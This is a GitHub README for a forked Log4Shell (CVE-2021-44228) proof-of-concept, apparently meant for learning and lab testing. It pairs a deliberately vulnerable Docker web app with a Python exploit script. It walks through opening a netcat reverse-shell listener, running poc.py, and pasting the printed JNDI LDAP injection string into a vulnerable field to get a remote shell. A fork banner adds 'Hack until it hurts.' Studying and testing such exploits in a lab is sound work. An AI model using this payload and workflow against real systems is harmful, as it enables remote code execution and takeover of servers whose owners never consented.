# Log4Shell Vulnerable WebApp PoC

############################################################################################
<b>Webmaster-Exit-1's Forked, Updated, Bug fixes, with Correct versions of software NOW included!</b><br>      
############################################################################################
<b>All my fork of this project does is make this tutorial actually useable. I'm not sure why the dev's</b><br>
<b>use incorrect software and software names. Almost as if they we're self sabotaging this project. Very odd.</b><br>
<b>I hope that my updated, corrected fork of this project comes in handy for you all.</b><br>
<b>Hack until it hurts. :)  -- WebMaster-Exit-1</b><br>
############################################################################################

A Proof-Of-Concept vulnerable web application for the Log4J vulnerability (CVE-2021-44228), based off Kozmer's Log4Shell POC.  This simple fork allows a web browser's User Agent to be logged when the site is visited.
Recently there was a new vulnerability in log4j, a java logging library that is very widely used in the likes of elasticsearch, minecraft and numerous others.

In this repository we have made and example vulnerable application and proof-of-concept (POC) exploit of it.

## A video showing the exploitation process

Vuln Web App:

<https://user-images.githubusercontent.com/87979263/146113359-20663eaa-555d-4d60-828d-a7f769ebd266.mp4>

Ghidra (Old script):

<https://user-images.githubusercontent.com/87979263/145728478-b4686da9-17d0-4511-be74-c6e6fff97740.mp4>

Minecraft PoC (Old script):

<https://user-images.githubusercontent.com/87979263/145681727-2bfd9884-a3e6-45dd-92e2-a624f29a8863.mp4>

Proof-of-concept (POC)

As a PoC we have created a python file that automates the process.

### Requirements

```bash
pip install -r requirements.txt
```

#### Usage

* Start a netcat listener to accept reverse shell connection.

```py
nc -lvnp 9001
```

* Launch the exploit.
**Note:** For this to work, the extracted java archive has to be named: `jdk1.8.0_20`, and be in the same directory.

```py
$ python3 poc.py --userip localhost --webport 8000 --lport 9001

[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc

[+] Exploit java class created success
[+] Setting up fake LDAP server

[+] Send me: ${jndi:ldap://localhost:1389/a}

Listening on 0.0.0.0:1389
```

This script will setup the HTTP server and the LDAP server for you, and it will also create the payload that you can use to paste into the vulnerable parameter. After this, if everything went well, you should get a shell on the lport.

Our vulnerable application

We have added a Dockerfile with the vulnerable webapp. You can use this by following the steps below:

```c
1: docker build -t log4j-shell-poc .
2: docker run --network host log4j-shell-poc
```

Once it is running, you can access it on localhost:8080

If you would like to further develop the project you can use Intellij IDE which we used to develop the project. We have also included a `.idea` folder where we have configuration files which make the job a bit easier. You can probably also use other IDE's too.

Getting the Java version

At the time of creating the exploit we were unsure of exactly which versions of java work and which don't so chose to work with one of the earliest versions of java 8: `java-8u20`.

Oracle thankfully provides an archive for all previous java versions:
[https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html).
Scroll down to `8u20` and download the appropriate files for your operating system and hardware.
![Screenshot from 2021-12-11 00-09-25](https://user-images.githubusercontent.com/46561460/145655967-b5808b9f-d919-476f-9cbc-ed9eaff51585.png)

**Note:** You do need to make an account to be able to download the package.

Once you have downloaded and extracted the archive, you can find `java` and a few related binaries in `jdk1.8.0_20/bin`.
**Note:** Please make sure to extract the jdk folder into this repository with the same name in order for it to work.

```javascript
❯ tar -xf jdk-8u20-linux-x64.tar.gz

❯ ./jdk1.8.0_20/bin/java -version
java version "1.8.0_20"
Java(TM) SE Runtime Environment (build 1.8.0_20-b26)
Java HotSpot(TM) 64-Bit Server VM (build 25.20-b23, mixed mode)
```

### Disclaimer

This repository is not intended to be a one-click exploit to CVE-2021-44228. The purpose of this project is to help people learn about this awesome vulnerability, and perhaps test their own applications (however there are better applications for this purpose, ei: [https://log4shell.tools/](https://log4shell.tools/)).

Our team will not aid, or endorse any use of this exploit for malicious activity, thus if you ask for help you may be required to provide us with proof that you either own the target service or you have permissions to pentest on it.
